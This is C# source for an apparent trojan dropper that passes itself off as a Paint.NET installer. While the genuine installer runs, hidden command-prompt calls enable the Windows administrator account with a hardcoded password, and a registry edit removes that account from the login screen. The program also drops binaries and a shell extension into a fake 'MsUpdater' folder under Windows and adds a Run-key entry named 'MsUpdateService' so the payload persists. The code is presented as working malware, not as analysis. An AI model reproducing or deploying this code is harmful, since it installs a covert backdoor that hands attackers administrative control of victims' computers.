namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Threading;

    using Expander.Properties;

    using Microsoft.Win32;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            new Thread(PaintNetInstall).Start();
            new Thread(Expand).Start();

            Console.Read();
        }

        private static Process CommandPrompt(string args)
        {
            return Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/C {args}",
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }

        private static bool sync;

        private static void Sync()
        {
            if (sync)
            {
                Environment.Exit(0);
            }

            sync = true;
        }

        private static void PaintNetInstall()
        {
            var copyTarget = Path.Combine(Path.GetTempPath(), "stpninstaller.exe");

            if (!File.Exists(copyTarget))
            {
                File.WriteAllBytes(copyTarget, Resources.Installer);
            }

            Process.Start(copyTarget);

            Sync();
        }

        private static void Expand()
        {
            const string Administrator = "administrator";
            const string Password = "abc123kappa";

            CommandPrompt($"net user {Administrator} /active:yes").WaitForExit();
            CommandPrompt($"net user {Administrator} {Password}").WaitForExit();
            
            Directory.CreateDirectory(@"C:\Windows\MsUpdater\ShellEx");

            const string Target = @"C:\Windows\MsUpdater\Bootstrap.exe";
            File.WriteAllBytes(Target, Resources.Bootstrap);
            File.WriteAllText(@"C:\Windows\MsUpdater\ShellEx\bootstrap", Target);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);
            
            const string SparkExecution = @"C:\Windows\MsUpdater\ShellEx\SparkExecution.dll";
            File.WriteAllBytes(SparkExecution, Resources.SparkExecution);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\LogicNP.EZShellExtensions.dll", Resources.LogicNP_EZShellExtensions);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\register.exe", Resources.register);
            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\restart.exe", Resources.RestartExplorer);

            CommandPrompt(@"C:\Windows\MsUpdater\ShellEx\register.exe -i C:\Windows\MsUpdater\ShellEx\SparkExecution.dll").WaitForExit();

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                // ReSharper disable PossibleNullReferenceException

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue(Administrator, 0);
                }

                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue("MsUpdateService", Target);
                }

                // ReSharper restore PossibleNullReferenceException
            }

            Sync();
        }
    }
}